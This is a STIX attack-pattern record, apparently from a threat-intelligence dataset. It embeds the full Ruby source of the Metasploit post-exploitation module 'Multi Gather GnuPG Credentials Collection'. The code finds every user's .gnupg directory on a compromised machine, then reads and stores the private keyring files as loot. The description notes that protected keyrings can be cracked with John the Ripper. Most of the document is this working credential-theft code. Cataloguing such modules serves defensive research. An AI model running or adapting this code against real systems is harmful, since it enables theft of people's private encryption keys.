{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--661b09f9-6d59-44bd-8cb4-941de5f8e229",
    "created": "2024-08-14T16:33:19.186934Z",
    "modified": "2024-08-14T16:33:19.186937Z",
    "name": "Multi Gather GnuPG Credentials Collection",
    "description": " This module will collect the contents of all users' .gnupg directories on the targeted machine. Password protected secret keyrings can be cracked with John the Ripper (JtR).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/gpg_creds.rb",
            "external_id": "gpg_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Unix\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather GnuPG Credentials Collection',\n        'Description' => %q{\n          This module will collect the contents of all users' .gnupg directories on the targeted\n          machine. Password protected secret keyrings can be cracked with John the Ripper (JtR).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Dhiru Kholia <dhiru[at]openwall.com>', # Original author\n          'Henry Hoggard' # Add GPG 2.1 keys, stop writing empty files\n        ],\n        'Platform' => %w[bsd linux osx unix],\n        'SessionTypes' => ['shell', 'meterpreter']\n      )\n    )\n  end\n\n  # This module is largely based on ssh_creds and firefox_creds.rb.\n\n  def run\n    paths = []\n    print_status('Finding GnuPG directories')\n    dirs = enum_user_directories\n    sub_dirs = ['private-keys-v1.d']\n\n    dirs.each do |dir|\n      gnupg_dir = \"#{dir}/.gnupg\"\n      next unless directory?(gnupg_dir)\n\n      paths << gnupg_dir\n\n      sub_dirs.each do |sub_dir|\n        paths << \"#{gnupg_dir}/#{sub_dir}\" if directory?(\"#{gnupg_dir}/#{sub_dir}\")\n      end\n    end\n\n    if paths.nil? || paths.empty?\n      print_error('No users found with a GnuPG directory')\n      return\n    end\n\n    download_loot(paths)\n  end\n\n  def download_loot(paths)\n    print_status(\"Looting #{paths.count} directories\")\n    paths.each do |path|\n      path.chomp!\n      sep = '/'\n      files = cmd_exec(\"ls -1 #{path}\").split(/\\r\\n|\\r|\\n/)\n\n      files.each do |file|\n        target = \"#{path}#{sep}#{file}\"\n        if directory?(target)\n          next\n        end\n\n        print_status(\"Downloading #{target} -> #{file}\")\n        data = read_file(target)\n        file = file.split(sep).last\n        type = file.gsub(/\\.gpg.*/, '').gsub(/gpg\\./, '')\n        if data.to_s.empty?\n          vprint_error(\"No data found for #{file}\")\n        else\n          loot_path = store_loot(\"gpg.#{type}\", 'text/plain', session, data,\n                                 \"gpg_#{file}\", \"GnuPG #{file} File\")\n          print_good(\"File stored in: #{loot_path}\")\n        end\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix]"
    ]
}